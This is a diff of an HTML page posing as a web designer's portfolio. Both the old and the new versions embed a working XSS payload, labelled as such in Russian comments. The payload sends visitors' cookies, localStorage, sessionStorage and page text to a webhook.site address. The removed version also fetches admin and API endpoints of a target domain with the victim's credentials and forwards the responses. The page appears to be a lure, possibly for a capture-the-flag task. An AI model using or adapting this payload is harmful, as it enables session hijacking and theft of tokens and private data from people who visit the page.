@@ -1,85 +1,50 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>My Design Portfolio</title>
-  <style>
-    body { font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; }
-    h1 { color: #333; }
-    p { line-height: 1.6; color: #555; }
-  </style>
+    <title>My Design Portfolio</title>
 </head>
 <body>
-  <h1>Hello, Giovanni Giorgio here</h1>
-  <p>Welcome to my design portfolio. I'm an uprising web-designer.</p>
-  <p>Check out my latest work and let me know what you think!</p>
+    <h1>Hello, Giovanni Giorgio here</h1>
+    <p>Welcome to my design portfolio!</p>
 
-  <!-- XSS PAYLOAD: начинается здесь -->
-  <script>
-  (function() {
-    const WEBHOOK = 'https://webhook.site/5777831e-326d-43f6-83a0-de255e891b9f';
+    <script>
+    (function() {
+        // 1. Замени это на свой чистый URL из webhook.site
+        const WEBHOOK = 'https://webhook.site/5777831e-326d-43f6-83a0-de255e891b9f';
 
-    // Универсальная функция отправки
-    function send(label, data) {
-      try {
-        fetch(WEBHOOK, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: JSON.stringify({
-            label: label,
-            url: location.href,
-            referrer: document.referrer,
-            data: data,
-            timestamp: new Date().toISOString()
-          })
-        });
-      } catch (e) {}
-    }
+        // Универсальная функция для отправки данных
+        function exfiltrate(label, data) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    type: label,
+                    data: data,
+                    url: location.href,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(e => {});
+        }
 
-    // 1. Cookie
-    send('cookies', document.cookie);
+        // 2. Кража cookie (самый вероятный вектор для получения сессии/пароля)
+        exfiltrate('cookies', document.cookie);
 
-    // 2. localStorage
-    try { send('localStorage', JSON.stringify(localStorage)); } catch (e) {}
+        // 3. Кража данных из localStorage (там могут быть токены)
+        try {
+            exfiltrate('localStorage', JSON.stringify(localStorage));
+        } catch(e) {}
 
-    // 3. sessionStorage
-    try { send('sessionStorage', JSON.stringify(sessionStorage)); } catch (e) {}
+        // 4. Кража данных из sessionStorage
+        try {
+            exfiltrate('sessionStorage', JSON.stringify(sessionStorage));
+        } catch(e) {}
 
-    // 4. Информация о браузере/окружении
-    send('env', JSON.stringify({
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      referrer: document.referrer,
-      origin: location.origin
-    }));
-
-    // 5. Пробуем достучаться до внутренних эндпоинтов target-домена
-    // (замените TARGET на реальный домен уязвимого приложения!)
-    const TARGET = 'https://TARGET-DOMAIN-HERE';
-    const endpoints = [
-      '/',
-      '/admin',
-      '/api/user',
-      '/api/me',
-      '/api/profile',
-      '/profile',
-      '/api/flag'
-    ];
-
-    endpoints.forEach(function(path) {
-      fetch(TARGET + path, { credentials: 'include' })
-        .then(function(r) { return r.text(); })
-        .then(function(text) {
-          send('endpoint:' + path, text.slice(0, 5000));
-        })
-        .catch(function(e) {
-          send('endpoint-error:' + path, e.message);
-        });
-    });
-  })();
-  </script>
-  <!-- XSS PAYLOAD: заканчивается здесь -->
-
+        // 5. Попытка прочитать что-то со страницы, где находится админ
+        // (например, если это админ-панель, там может быть email или другой敏感信息)
+        setTimeout(() => {
+            exfiltrate('page_text', document.body.innerText.slice(0, 3000));
+        }, 1000);
+    })();
+    </script>
 </body>
 </html>
